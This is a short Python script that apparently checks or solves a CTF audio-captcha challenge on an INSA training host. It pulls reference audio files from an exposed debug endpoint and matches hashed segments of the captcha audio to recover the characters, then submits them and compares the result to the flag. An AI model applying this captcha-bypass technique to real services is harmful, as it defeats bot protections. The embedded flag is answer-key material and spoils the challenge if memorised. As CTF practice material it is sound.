#!/usr/bin/python3
import glob
import os
from hashlib import md5
import requests
import io

url = "https://captcha-audio.insecurity-insa.fr"

def download_audio_files():
    zip_f = requests.get(url + "/debug").content
    with open("/tmp/out.zip", "wb") as f:
        f.write(zip_f)
    os.system("rm -rf /tmp/audioFiles")
    os.system("7z e /tmp/out.zip -ptoto -o/tmp/audioFiles > /dev/null")
    os.system("rm -f /tmp/out.zip")


def alive():
    return "My personal anti-bot" in requests.get(url).text


def exploitable():
    # Attention il faut avoir les fichiers audio En Local (archive disponible à l'adress /debug et mdp toto)
    # Il ne FAUT PAS générer les fichiers localement, ils ne seraient pas les mêmes.
    download_audio_files()
    files = glob.glob('/tmp/audioFiles/*.wav')
    dico = {}
    for fle in files:
        with open(fle, "rb") as f:
            text = f.read()
            text = text[44:]
            text = text.strip(b'\x00'*10)
            dico[md5(text).hexdigest()] = os.path.basename(fle)[0]
    s = requests.session()
    r = s.get(url + "/captcha",timeout=1)
    with io.BytesIO(r.content) as resul:
        x = resul.read()
        x = x[44:]
        out = []
        for part in x.split(b'\x00' * 100):
            part = part.strip(b'\x00'*10)
            if len(part) > 1000:
                part = md5(part).hexdigest()
                assert part in dico
                out.append(dico[part])
        assert len(out) == 45
        data = {
            'captcha':''.join(out),
        }
        r2 = s.post(url + "/submit",data=data)
        return r2.text == "INSA{C4ptcha_Ar3_T0o_S1mple}"


if __name__ == "__main__":
    print(alive() and exploitable())
